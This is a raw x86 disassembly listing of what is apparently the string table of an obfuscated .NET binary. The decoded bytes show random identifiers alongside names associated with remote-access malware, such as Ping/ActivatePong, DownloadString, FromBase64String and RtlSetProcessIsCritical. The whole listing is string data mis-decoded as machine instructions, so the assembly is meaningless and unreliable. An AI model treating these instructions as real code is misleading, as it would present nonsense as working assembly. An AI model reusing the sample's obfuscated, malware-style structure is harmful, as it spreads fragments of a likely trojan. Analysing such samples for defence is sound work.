  408aec:	48                   	dec    %eax
  408aed:	65 4b                	gs dec %ebx
  408aef:	77 70                	ja     0x408b61
  408af1:	6b 6e 67 66          	imul   $0x66,0x67(%esi),%ebp
  408af5:	00 45 6d             	add    %al,0x6d(%ebp)
  408af8:	76 55                	jbe    0x408b4f
  408afa:	4d                   	dec    %ebp
  408afb:	53                   	push   %ebx
  408afc:	67 4a                	addr16 dec %edx
  408afe:	56                   	push   %esi
  408aff:	6d                   	insl   (%dx),%es:(%edi)
  408b00:	51                   	push   %ecx
  408b01:	62 72 6a             	bound  %esi,0x6a(%edx)
  408b04:	66 00 6a 6b          	data16 add %ch,0x6b(%edx)
  408b08:	51                   	push   %ecx
  408b09:	4a                   	dec    %edx
  408b0a:	6a 78                	push   $0x78
  408b0c:	6b 63 51 6c          	imul   $0x6c,0x51(%ebx),%esp
  408b10:	66 00 55 52          	data16 add %dl,0x52(%ebp)
  408b14:	77 43                	ja     0x408b59
  408b16:	57                   	push   %edi
  408b17:	63 4d 72             	arpl   %ecx,0x72(%ebp)
  408b1a:	4a                   	dec    %edx
  408b1b:	47                   	inc    %edi
  408b1c:	73 66                	jae    0x408b84
  408b1e:	00 6d 51             	add    %ch,0x51(%ebp)
  408b21:	54                   	push   %esp
  408b22:	5a                   	pop    %edx
  408b23:	6b 6d 66 52          	imul   $0x52,0x66(%ebp),%ebp
  408b27:	52                   	push   %edx
  408b28:	51                   	push   %ecx
  408b29:	78 6b                	js     0x408b96
  408b2b:	49                   	dec    %ecx
  408b2c:	61                   	popa
  408b2d:	46                   	inc    %esi
  408b2e:	75 66                	jne    0x408b96
  408b30:	00 65 4c             	add    %ah,0x4c(%ebp)
  408b33:	4b                   	dec    %ebx
  408b34:	48                   	dec    %eax
  408b35:	54                   	push   %esp
  408b36:	4e                   	dec    %esi
  408b37:	63 50 49             	arpl   %edx,0x49(%eax)
  408b3a:	51                   	push   %ecx
  408b3b:	79 76                	jns    0x408bb3
  408b3d:	66 00 70 46          	data16 add %dh,0x46(%eax)
  408b41:	45                   	inc    %ebp
  408b42:	45                   	inc    %ebp
  408b43:	48                   	dec    %eax
  408b44:	65 72 4e             	gs jb  0x408b95
  408b47:	76 64                	jbe    0x408bad
  408b49:	4d                   	dec    %ebp
  408b4a:	45                   	inc    %ebp
  408b4b:	67 00 4c 77          	add    %cl,0x77(%si)
  408b4f:	4c                   	dec    %esp
  408b50:	79 70                	jns    0x408bc2
  408b52:	53                   	push   %ebx
  408b53:	76 57                	jbe    0x408bac
  408b55:	59                   	pop    %ecx
  408b56:	73 5a                	jae    0x408bb2
  408b58:	67 4a                	addr16 dec %edx
  408b5a:	67 00 65 41          	add    %ah,0x41(%di)
  408b5e:	50                   	push   %eax
  408b5f:	65 44                	gs inc %esp
  408b61:	48                   	dec    %eax
  408b62:	57                   	push   %edi
  408b63:	63 57 73             	arpl   %edx,0x73(%edi)
  408b66:	66 57                	push   %di
  408b68:	67 00 43 72          	add    %al,0x72(%bp,%di)
  408b6c:	79 70                	jns    0x408bde
  408b6e:	74 6f                	je     0x408bdf
  408b70:	43                   	inc    %ebx
  408b71:	6f                   	outsl  %ds:(%esi),(%dx)
  408b72:	6e                   	outsb  %ds:(%esi),(%dx)
  408b73:	66 69 67 00 6a 51    	imul   $0x516a,0x0(%edi),%sp
  408b79:	67 6e                	outsb  %ds:(%si),(%dx)
  408b7b:	51                   	push   %ecx
  408b7c:	72 77                	jb     0x408bf5
  408b7e:	48                   	dec    %eax
  408b7f:	66 43                	inc    %bx
  408b81:	7a 44                	jp     0x408bc7
  408b83:	6d                   	insl   (%dx),%es:(%edi)
  408b84:	6b 67 00 67          	imul   $0x67,0x0(%edi),%esp
  408b88:	65 74 5f             	gs je  0x408bea
  408b8b:	50                   	push   %eax
  408b8c:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408b93:	5f                   	pop    %edi
  408b94:	50                   	push   %eax
  408b95:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408b9c:	74 65                	je     0x408c03
  408b9e:	6d                   	insl   (%dx),%es:(%edi)
  408b9f:	2e 54                	cs push %esp
  408ba1:	68 72 65 61 64       	push   $0x64616572
  408ba6:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408bad:	5f                   	pop    %edi
  408bae:	50                   	push   %eax
  408baf:	61                   	popa
  408bb0:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  408bb7:	64 64 
  408bb9:	5f                   	pop    %edi
  408bba:	53                   	push   %ebx
  408bbb:	65 73 73             	gs jae 0x408c31
  408bbe:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408bc5:	6e                   	outsb  %ds:(%esi),(%dx)
  408bc6:	67 00 55 54          	add    %dl,0x54(%di)
  408bca:	46                   	inc    %esi
  408bcb:	38 45 6e             	cmp    %al,0x6e(%ebp)
  408bce:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408bd1:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408bd8:	74 65                	je     0x408c3f
  408bda:	6d                   	insl   (%dx),%es:(%edi)
  408bdb:	2e 44                	cs inc %esp
  408bdd:	72 61                	jb     0x408c40
  408bdf:	77 69                	ja     0x408c4a
  408be1:	6e                   	outsb  %ds:(%esi),(%dx)
  408be2:	67 2e 49             	addr16 cs dec %ecx
  408be5:	6d                   	insl   (%dx),%es:(%edi)
  408be6:	61                   	popa
  408be7:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  408bee:	73 
  408bef:	74 65                	je     0x408c56
  408bf1:	6d                   	insl   (%dx),%es:(%edi)
  408bf2:	2e 52                	cs push %edx
  408bf4:	75 6e                	jne    0x408c64
  408bf6:	74 69                	je     0x408c61
  408bf8:	6d                   	insl   (%dx),%es:(%edi)
  408bf9:	65 2e 56             	gs cs push %esi
  408bfc:	65 72 73             	gs jb  0x408c72
  408bff:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  408c06:	46                   	inc    %esi
  408c07:	72 6f                	jb     0x408c78
  408c09:	6d                   	insl   (%dx),%es:(%edi)
  408c0a:	42                   	inc    %edx
  408c0b:	61                   	popa
  408c0c:	73 65                	jae    0x408c73
  408c0e:	36 34 53             	ss xor $0x53,%al
  408c11:	74 72                	je     0x408c85
  408c13:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  408c1a:	61                   	popa
  408c1b:	73 65                	jae    0x408c82
  408c1d:	36 34 53             	ss xor $0x53,%al
  408c20:	74 72                	je     0x408c94
  408c22:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  408c29:	6e                   	outsb  %ds:(%esi),(%dx)
  408c2a:	6c                   	insb   (%dx),%es:(%edi)
  408c2b:	6f                   	outsl  %ds:(%esi),(%dx)
  408c2c:	61                   	popa
  408c2d:	64 53                	fs push %ebx
  408c2f:	74 72                	je     0x408ca3
  408c31:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  408c38:	74 72                	je     0x408cac
  408c3a:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  408c41:	5f                   	pop    %edi
  408c42:	41                   	inc    %ecx
  408c43:	73 53                	jae    0x408c98
  408c45:	74 72                	je     0x408cb9
  408c47:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408c4e:	5f                   	pop    %edi
  408c4f:	41                   	inc    %ecx
  408c50:	73 53                	jae    0x408ca5
  408c52:	74 72                	je     0x408cc6
  408c54:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  408c5b:	53                   	push   %ebx
  408c5c:	74 72                	je     0x408cd0
  408c5e:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  408c65:	73 74                	jae    0x408cdb
  408c67:	72 69                	jb     0x408cd2
  408c69:	6e                   	outsb  %ds:(%esi),(%dx)
  408c6a:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  408c6e:	73 74                	jae    0x408ce4
  408c70:	65 6d                	gs insl (%dx),%es:(%edi)
  408c72:	2e 44                	cs inc %esp
  408c74:	72 61                	jb     0x408cd7
  408c76:	77 69                	ja     0x408ce1
  408c78:	6e                   	outsb  %ds:(%esi),(%dx)
  408c79:	67 00 67 65          	add    %ah,0x65(%bx)
  408c7d:	74 5f                	je     0x408cde
  408c7f:	41                   	inc    %ecx
  408c80:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408c84:	61                   	popa
  408c85:	74 65                	je     0x408cec
  408c87:	50                   	push   %eax
  408c88:	6f                   	outsl  %ds:(%esi),(%dx)
  408c89:	6e                   	outsb  %ds:(%esi),(%dx)
  408c8a:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408c8e:	74 5f                	je     0x408cef
  408c90:	41                   	inc    %ecx
  408c91:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408c95:	61                   	popa
  408c96:	74 65                	je     0x408cfd
  408c98:	50                   	push   %eax
  408c99:	6f                   	outsl  %ds:(%esi),(%dx)
  408c9a:	6e                   	outsb  %ds:(%esi),(%dx)
  408c9b:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408c9f:	74 5f                	je     0x408d00
  408ca1:	45                   	inc    %ebp
  408ca2:	72 72                	jb     0x408d16
  408ca4:	6f                   	outsl  %ds:(%esi),(%dx)
  408ca5:	72 44                	jb     0x408ceb
  408ca7:	69 61 6c 6f 67 00 58 	imul   $0x5800676f,0x6c(%ecx),%esp
  408cae:	61                   	popa
  408caf:	72 70                	jb     0x408d21
  408cb1:	41                   	inc    %ecx
  408cb2:	4c                   	dec    %esp
  408cb3:	6c                   	insb   (%dx),%es:(%edi)
  408cb4:	55                   	push   %ebp
  408cb5:	72 73                	jb     0x408d2a
  408cb7:	67 00 6b 54          	add    %ch,0x54(%bp,%di)
  408cbb:	67 72 67             	addr16 jb 0x408d25
  408cbe:	53                   	push   %ebx
  408cbf:	42                   	inc    %edx
  408cc0:	42                   	inc    %edx
  408cc1:	46                   	inc    %esi
  408cc2:	4d                   	dec    %ebp
  408cc3:	78 67                	js     0x408d2c
  408cc5:	00 4b 47             	add    %cl,0x47(%ebx)
  408cc8:	74 49                	je     0x408d13
  408cca:	4e                   	dec    %esi
  408ccb:	46                   	inc    %esi
  408ccc:	52                   	push   %edx
  408ccd:	4e                   	dec    %esi
  408cce:	58                   	pop    %eax
  408ccf:	57                   	push   %edi
  408cd0:	4a                   	dec    %edx
  408cd1:	54                   	push   %esp
  408cd2:	4b                   	dec    %ebx
  408cd3:	68 00 51 69 66       	push   $0x66695100
  408cd8:	77 55                	ja     0x408d2f
  408cda:	4a                   	dec    %edx
  408cdb:	6f                   	outsl  %ds:(%esi),(%dx)
  408cdc:	6c                   	insb   (%dx),%es:(%edi)
  408cdd:	4c                   	dec    %esp
  408cde:	68 00 57 77 4a       	push   $0x4a775700
  408ce3:	66 71 47             	data16 jno 0x408d2d
  408ce6:	4f                   	dec    %edi
  408ce7:	4d                   	dec    %ebp
  408ce8:	4d                   	dec    %ebp
  408ce9:	4d                   	dec    %ebp
  408cea:	68 00 4d 63 47       	push   $0x47634d00
  408cef:	6c                   	insb   (%dx),%es:(%edi)
  408cf0:	41                   	inc    %ecx
  408cf1:	59                   	pop    %ecx
  408cf2:	5a                   	pop    %edx
  408cf3:	61                   	popa
  408cf4:	52                   	push   %edx
  408cf5:	57                   	push   %edi
  408cf6:	68 00 52 76 6c       	push   $0x6c765200
  408cfb:	41                   	inc    %ecx
  408cfc:	4c                   	dec    %esp
  408cfd:	48                   	dec    %eax
  408cfe:	73 42                	jae    0x408d42
  408d00:	59                   	pop    %ecx
  408d01:	68 00 4b 74 56       	push   $0x56744b00
  408d06:	73 79                	jae    0x408d81
  408d08:	41                   	inc    %ecx
  408d09:	6c                   	insb   (%dx),%es:(%edi)
  408d0a:	75 72                	jne    0x408d7e
  408d0c:	53                   	push   %ebx
  408d0d:	59                   	pop    %ecx
  408d0e:	68 00 51 6f 4d       	push   $0x4d6f5100
  408d13:	49                   	dec    %ecx
  408d14:	4d                   	dec    %ebp
  408d15:	55                   	push   %ebp
  408d16:	48                   	dec    %eax
  408d17:	77 4d                	ja     0x408d66
  408d19:	6e                   	outsb  %ds:(%esi),(%dx)
  408d1a:	6a 70                	push   $0x70
  408d1c:	68 00 43 6f 6d       	push   $0x6d6f4300
  408d21:	70 75                	jo     0x408d98
  408d23:	74 65                	je     0x408d8a
  408d25:	48                   	dec    %eax
  408d26:	61                   	popa
  408d27:	73 68                	jae    0x408d91
  408d29:	00 56 65             	add    %dl,0x65(%esi)
  408d2c:	72 69                	jb     0x408d97
  408d2e:	66 79 48             	data16 jns 0x408d79
  408d31:	61                   	popa
  408d32:	73 68                	jae    0x408d9c
  408d34:	00 46 6c             	add    %al,0x6c(%esi)
  408d37:	75 73                	jne    0x408dac
  408d39:	68 00 42 4a 4c       	push   $0x4c4a4200
  408d3e:	75 65                	jne    0x408da5
  408d40:	57                   	push   %edi
  408d41:	71 6d                	jno    0x408db0
  408d43:	4f                   	dec    %edi
  408d44:	57                   	push   %edi
  408d45:	77 4a                	ja     0x408d91
  408d47:	74 68                	je     0x408db1
  408d49:	00 67 65             	add    %ah,0x65(%edi)
  408d4c:	74 5f                	je     0x408dad
  408d4e:	45                   	inc    %ebp
  408d4f:	78 65                	js     0x408db6
  408d51:	63 75 74             	arpl   %esi,0x74(%ebp)
  408d54:	61                   	popa
  408d55:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  408d59:	61                   	popa
  408d5a:	74 68                	je     0x408dc4
  408d5c:	00 47 65             	add    %al,0x65(%edi)
  408d5f:	74 54                	je     0x408db5
  408d61:	65 6d                	gs insl (%dx),%es:(%edi)
  408d63:	70 50                	jo     0x408db5
  408d65:	61                   	popa
  408d66:	74 68                	je     0x408dd0
  408d68:	00 67 65             	add    %ah,0x65(%edi)
  408d6b:	74 5f                	je     0x408dcc
  408d6d:	4c                   	dec    %esp
  408d6e:	65 6e                	outsb  %gs:(%esi),(%dx)
  408d70:	67 74 68             	addr16 je 0x408ddb
  408d73:	00 47 49             	add    %al,0x49(%edi)
  408d76:	54                   	push   %esp
  408d77:	58                   	pop    %eax
  408d78:	74 59                	je     0x408dd3
  408d7a:	55                   	push   %ebp
  408d7b:	54                   	push   %esp
  408d7c:	4c                   	dec    %esp
  408d7d:	4e                   	dec    %esi
  408d7e:	69 00 49 59 65 64    	imul   $0x64655949,(%eax),%eax
  408d84:	78 65                	js     0x408deb
  408d86:	6d                   	insl   (%dx),%es:(%edi)
  408d87:	59                   	pop    %ecx
  408d88:	61                   	popa
  408d89:	5a                   	pop    %edx
  408d8a:	48                   	dec    %eax
  408d8b:	4f                   	dec    %edi
  408d8c:	71 58                	jno    0x408de6
  408d8e:	6b 69 00 55          	imul   $0x55,0x0(%ecx),%ebp
  408d92:	72 69                	jb     0x408dfd
  408d94:	00 56 61             	add    %dl,0x61(%esi)
  408d97:	4e                   	dec    %esi
  408d98:	6f                   	outsl  %ds:(%esi),(%dx)
  408d99:	57                   	push   %edi
  408d9a:	56                   	push   %esi
  408d9b:	4e                   	dec    %esi
  408d9c:	77 55                	ja     0x408df3
  408d9e:	66 74 69             	data16 je 0x408e0a
  408da1:	00 43 56             	add    %al,0x56(%ebx)
  408da4:	64 52                	fs push %edx
  408da6:	51                   	push   %ecx
  408da7:	4d                   	dec    %ebp
  408da8:	67 59                	addr16 pop %ecx
  408daa:	59                   	pop    %ecx
  408dab:	41                   	inc    %ecx
  408dac:	6a 00                	push   $0x0
  408dae:	63 44 56 49          	arpl   %eax,0x49(%esi,%edx,2)
  408db2:	57                   	push   %edi
  408db3:	45                   	inc    %ebp
  408db4:	61                   	popa
  408db5:	48                   	dec    %eax
  408db6:	57                   	push   %edi
  408db7:	62 4d 6a             	bound  %ecx,0x6a(%ebp)
  408dba:	00 4f 6f             	add    %cl,0x6f(%edi)
  408dbd:	44                   	inc    %esp
  408dbe:	57                   	push   %edi
  408dbf:	56                   	push   %esi
  408dc0:	72 49                	jb     0x408e0b
  408dc2:	57                   	push   %edi
  408dc3:	57                   	push   %edi
  408dc4:	74 46                	je     0x408e0c
  408dc6:	4d                   	dec    %ebp
  408dc7:	51                   	push   %ecx
  408dc8:	6a 00                	push   $0x0
  408dca:	75 6e                	jne    0x408e3a
  408dcc:	59                   	pop    %ecx
  408dcd:	58                   	pop    %eax
  408dce:	5a                   	pop    %edx
  408dcf:	62 6d 7a             	bound  %ebp,0x7a(%ebp)
  408dd2:	46                   	inc    %esi
  408dd3:	57                   	push   %edi
  408dd4:	55                   	push   %ebp
  408dd5:	6a 00                	push   $0x0
  408dd7:	70 67                	jo     0x408e40
  408dd9:	74 79                	je     0x408e54
  408ddb:	43                   	inc    %ebx
  408ddc:	78 64                	js     0x408e42
  408dde:	6c                   	insb   (%dx),%es:(%edi)
  408ddf:	64 53                	fs push %ebx
  408de1:	67 58                	addr16 pop %eax
  408de3:	6a 00                	push   $0x0
  408de5:	78 6e                	js     0x408e55
  408de7:	71 51                	jno    0x408e3a
  408de9:	57                   	push   %edi
  408dea:	4b                   	dec    %ebx
  408deb:	61                   	popa
  408dec:	72 47                	jb     0x408e35
  408dee:	5a                   	pop    %edx
  408def:	6a 00                	push   $0x0
  408df1:	59                   	pop    %ecx
  408df2:	6b 6f 67 6d          	imul   $0x6d,0x67(%edi),%ebp
  408df6:	6b 6f 74 78          	imul   $0x78,0x74(%edi),%ebp
  408dfa:	6c                   	insb   (%dx),%es:(%edi)
  408dfb:	57                   	push   %edi
  408dfc:	6d                   	insl   (%dx),%es:(%edi)
  408dfd:	6e                   	outsb  %ds:(%esi),(%dx)
  408dfe:	6a 00                	push   $0x0
  408e00:	45                   	inc    %ebp
  408e01:	77 56                	ja     0x408e59
  408e03:	75 4d                	jne    0x408e52
  408e05:	64 58                	fs pop %eax
  408e07:	77 4a                	ja     0x408e53
  408e09:	75 6a                	jne    0x408e75
  408e0b:	00 70 68             	add    %dh,0x68(%eax)
  408e0e:	44                   	inc    %esp
  408e0f:	75 67                	jne    0x408e78
  408e11:	46                   	inc    %esi
  408e12:	4e                   	dec    %esi
  408e13:	51                   	push   %ecx
  408e14:	7a 6c                	jp     0x408e82
  408e16:	41                   	inc    %ecx
  408e17:	42                   	inc    %edx
  408e18:	41                   	inc    %ecx
  408e19:	4c                   	dec    %esp
  408e1a:	43                   	inc    %ebx
  408e1b:	6b 00 7a             	imul   $0x7a,(%eax),%eax
  408e1e:	72 63                	jb     0x408e83
  408e20:	70 6d                	jo     0x408e8f
  408e22:	56                   	push   %esi
  408e23:	72 72                	jb     0x408e97
  408e25:	57                   	push   %edi
  408e26:	66 44                	inc    %sp
  408e28:	6b 00 66             	imul   $0x66,(%eax),%eax
  408e2b:	4e                   	dec    %esi
  408e2c:	78 7a                	js     0x408ea8
  408e2e:	69 74 4b 77 7a 5a 55 	imul   $0x4f555a7a,0x77(%ebx,%ecx,2),%esi
  408e35:	4f 
  408e36:	6b 00 4d             	imul   $0x4d,(%eax),%eax
  408e39:	51                   	push   %ecx
  408e3a:	66 45                	inc    %bp
  408e3c:	4e                   	dec    %esi
  408e3d:	78 78                	js     0x408eb7
  408e3f:	78 71                	js     0x408eb2
  408e41:	64 53                	fs push %ebx
  408e43:	6b 00 41             	imul   $0x41,(%eax),%eax
  408e46:	73 79                	jae    0x408ec1
  408e48:	6e                   	outsb  %ds:(%esi),(%dx)
  408e49:	63 43 61             	arpl   %eax,0x61(%ebx)
  408e4c:	6c                   	insb   (%dx),%es:(%edi)
  408e4d:	6c                   	insb   (%dx),%es:(%edi)
  408e4e:	62 61 63             	bound  %esp,0x63(%ecx)
  408e51:	6b 00 52             	imul   $0x52,(%eax),%eax
  408e54:	65 6d                	gs insl (%dx),%es:(%edi)
  408e56:	6f                   	outsl  %ds:(%esi),(%dx)
  408e57:	74 65                	je     0x408ebe
  408e59:	43                   	inc    %ebx
  408e5a:	65 72 74             	gs jb  0x408ed1
  408e5d:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408e64:	56                   	push   %esi
  408e65:	61                   	popa
  408e66:	6c                   	insb   (%dx),%es:(%edi)
  408e67:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  408e6e:	43 
  408e6f:	61                   	popa
  408e70:	6c                   	insb   (%dx),%es:(%edi)
  408e71:	6c                   	insb   (%dx),%es:(%edi)
  408e72:	62 61 63             	bound  %esp,0x63(%ecx)
  408e75:	6b 00 54             	imul   $0x54,(%eax),%eax
  408e78:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  408e7f:	6c                   	insb   (%dx),%es:(%edi)
  408e80:	62 61 63             	bound  %esp,0x63(%ecx)
  408e83:	6b 00 52             	imul   $0x52,(%eax),%eax
  408e86:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  408e8d:	4b 65 
  408e8f:	79 50                	jns    0x408ee1
  408e91:	65 72 6d             	gs jb  0x408f01
  408e94:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  408e9b:	68 65 63 6b 00       	push   $0x6b6365
  408ea0:	46                   	inc    %esi
  408ea1:	6c                   	insb   (%dx),%es:(%edi)
  408ea2:	75 73                	jne    0x408f17
  408ea4:	68 46 69 6e 61       	push   $0x616e6946
  408ea9:	6c                   	insb   (%dx),%es:(%edi)
  408eaa:	42                   	inc    %edx
  408eab:	6c                   	insb   (%dx),%es:(%edi)
  408eac:	6f                   	outsl  %ds:(%esi),(%dx)
  408ead:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408eb0:	51                   	push   %ecx
  408eb1:	56                   	push   %esi
  408eb2:	50                   	push   %eax
  408eb3:	73 44                	jae    0x408ef9
  408eb5:	72 54                	jb     0x408f0b
  408eb7:	69 63 6f 6b 00 46 6e 	imul   $0x6e46006b,0x6f(%ebx),%esp
  408ebe:	62 6e 46             	bound  %ebp,0x46(%esi)
  408ec1:	6d                   	insl   (%dx),%es:(%edi)
  408ec2:	54                   	push   %esp
  408ec3:	44                   	inc    %esp
  408ec4:	53                   	push   %ebx
  408ec5:	4e                   	dec    %esi
  408ec6:	66 65 45             	gs inc %bp
  408ec9:	6c                   	insb   (%dx),%es:(%edi)
  408eca:	00 69 6b             	add    %ch,0x6b(%ecx)
  408ecd:	69 46 50 4b 61 6a 43 	imul   $0x436a614b,0x50(%esi),%eax
  408ed4:	52                   	push   %edx
  408ed5:	6f                   	outsl  %ds:(%esi),(%dx)
  408ed6:	4c                   	dec    %esp
  408ed7:	6c                   	insb   (%dx),%es:(%edi)
  408ed8:	00 6f 52             	add    %ch,0x52(%edi)
  408edb:	61                   	popa
  408edc:	6c                   	insb   (%dx),%es:(%edi)
  408edd:	74 4b                	je     0x408f2a
  408edf:	5a                   	pop    %edx
  408ee0:	78 61                	js     0x408f43
  408ee2:	59                   	pop    %ecx
  408ee3:	4a                   	dec    %edx
  408ee4:	55                   	push   %ebp
  408ee5:	6c                   	insb   (%dx),%es:(%edi)
  408ee6:	00 52 74             	add    %dl,0x74(%edx)
  408ee9:	6c                   	insb   (%dx),%es:(%edi)
  408eea:	53                   	push   %ebx
  408eeb:	65 74 50             	gs je  0x408f3e
  408eee:	72 6f                	jb     0x408f5f
  408ef0:	63 65 73             	arpl   %esp,0x73(%ebp)
  408ef3:	73 49                	jae    0x408f3e
  408ef5:	73 43                	jae    0x408f3a
  408ef7:	72 69                	jb     0x408f62
  408ef9:	74 69                	je     0x408f64
  408efb:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408efe:	00 4e 65             	add    %cl,0x65(%esi)
  408f01:	74 77                	je     0x408f7a
  408f03:	6f                   	outsl  %ds:(%esi),(%dx)
  408f04:	72 6b                	jb     0x408f71
  408f06:	43                   	inc    %ebx
  408f07:	72 65                	jb     0x408f6e
  408f09:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f0c:	74 69                	je     0x408f77
  408f0e:	61                   	popa
  408f0f:	6c                   	insb   (%dx),%es:(%edi)
  408f10:	00 53 79             	add    %dl,0x79(%ebx)
  408f13:	73 74                	jae    0x408f89
  408f15:	65 6d                	gs insl (%dx),%es:(%edi)
  408f17:	2e 53                	cs push %ebx
  408f19:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408f1d:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  408f24:	6e 
  408f25:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408f28:	61                   	popa
  408f29:	6c                   	insb   (%dx),%es:(%edi)
  408f2a:	00 57 69             	add    %dl,0x69(%edi)
  408f2d:	6e                   	outsb  %ds:(%esi),(%dx)
  408f2e:	64 6f                	outsl  %fs:(%esi),(%dx)
  408f30:	77 73                	ja     0x408fa5
  408f32:	50                   	push   %eax
  408f33:	72 69                	jb     0x408f9e
  408f35:	6e                   	outsb  %ds:(%esi),(%dx)
  408f36:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408f39:	61                   	popa
  408f3a:	6c                   	insb   (%dx),%es:(%edi)
  408f3b:	00 67 65             	add    %ah,0x65(%edi)
  408f3e:	74 5f                	je     0x408f9f
  408f40:	49                   	dec    %ecx
  408f41:	6e                   	outsb  %ds:(%esi),(%dx)
  408f42:	74 65                	je     0x408fa9
  408f44:	72 76                	jb     0x408fbc
  408f46:	61                   	popa
  408f47:	6c                   	insb   (%dx),%es:(%edi)
  408f48:	00 73 65             	add    %dh,0x65(%ebx)
  408f4b:	74 5f                	je     0x408fac
  408f4d:	49                   	dec    %ecx
  408f4e:	6e                   	outsb  %ds:(%esi),(%dx)
  408f4f:	74 65                	je     0x408fb6
  408f51:	72 76                	jb     0x408fc9
  408f53:	61                   	popa
  408f54:	6c                   	insb   (%dx),%es:(%edi)
  408f55:	00 51 52             	add    %dl,0x52(%ecx)
  408f58:	61                   	popa
  408f59:	63 49 4f             	arpl   %ecx,0x4f(%ecx)
  408f5c:	6f                   	outsl  %ds:(%esi),(%dx)
  408f5d:	4f                   	dec    %edi
  408f5e:	46                   	inc    %esi
  408f5f:	72 4e                	jb     0x408faf
  408f61:	78 56                	js     0x408fb9
  408f63:	55                   	push   %ebp
  408f64:	67 6c                	insb   (%dx),%es:(%di)
  408f66:	00 5a 48             	add    %bl,0x48(%edx)
  408f69:	45                   	inc    %ebp
  408f6a:	57                   	push   %edi
  408f6b:	7a 77                	jp     0x408fe4
  408f6d:	72 4a                	jb     0x408fb9
  408f6f:	72 51                	jb     0x408fc2
  408f71:	69 6c 00 50 78 78 6e 	imul   $0x7a6e7878,0x50(%eax,%eax,1),%ebp
  408f78:	7a 
  408f79:	49                   	dec    %ecx
  408f7a:	58                   	pop    %eax
  408f7b:	6e                   	outsb  %ds:(%esi),(%dx)
  408f7c:	77 4c                	ja     0x408fca
  408f7e:	6d                   	insl   (%dx),%es:(%edi)
  408f7f:	58                   	pop    %eax
  408f80:	65 6a 6c             	gs push $0x6c
  408f83:	00 6b 65             	add    %ch,0x65(%ebx)
  408f86:	72 6e                	jb     0x408ff6
  408f88:	65 6c                	gs insb (%dx),%es:(%edi)
  408f8a:	33 32                	xor    (%edx),%esi
  408f8c:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408f8f:	6c                   	insb   (%dx),%es:(%edi)
  408f90:	00 75 73             	add    %dh,0x73(%ebp)
  408f93:	65 72 33             	gs jb  0x408fc9
  408f96:	32 2e                	xor    (%esi),%ch
  408f98:	64 6c                	fs insb (%dx),%es:(%edi)
  408f9a:	6c                   	insb   (%dx),%es:(%edi)
  408f9b:	00 6e 74             	add    %ch,0x74(%esi)
  408f9e:	64 6c                	fs insb (%dx),%es:(%edi)
  408fa0:	6c                   	insb   (%dx),%es:(%edi)
  408fa1:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408fa4:	6c                   	insb   (%dx),%es:(%edi)
  408fa5:	00 4b 69             	add    %cl,0x69(%ebx)
  408fa8:	6c                   	insb   (%dx),%es:(%edi)
  408fa9:	6c                   	insb   (%dx),%es:(%edi)
  408faa:	00 50 6f             	add    %dl,0x6f(%eax)
  408fad:	6c                   	insb   (%dx),%es:(%edi)
  408fae:	6c                   	insb   (%dx),%es:(%edi)
  408faf:	00 58 65             	add    %bl,0x65(%eax)
  408fb2:	70 73                	jo     0x409027
  408fb4:	63 4d 58             	arpl   %ecx,0x58(%ebp)
  408fb7:	4a                   	dec    %edx
  408fb8:	68 6d 6c 00 42       	push   $0x42006c6d
  408fbd:	56                   	push   %esi
  408fbe:	78 4a                	js     0x40900a
  408fc0:	53                   	push   %ebx
  408fc1:	4d                   	dec    %ebp
  408fc2:	73 55                	jae    0x409019
  408fc4:	5a                   	pop    %edx
  408fc5:	7a 4f                	jp     0x409016
  408fc7:	74 6c                	je     0x409035
  408fc9:	00 44 56 4a          	add    %al,0x4a(%esi,%edx,2)
  408fcd:	7a 49                	jp     0x409018
  408fcf:	4a                   	dec    %edx
  408fd0:	49                   	dec    %ecx
  408fd1:	77 64                	ja     0x409037
  408fd3:	46                   	inc    %esi
  408fd4:	4c                   	dec    %esp
  408fd5:	46                   	inc    %esi
  408fd6:	76 6c                	jbe    0x409044
  408fd8:	00 78 73             	add    %bh,0x73(%eax)
  408fdb:	62 52 45             	bound  %edx,0x45(%edx)
  408fde:	4f                   	dec    %edi
  408fdf:	4b                   	dec    %ebx
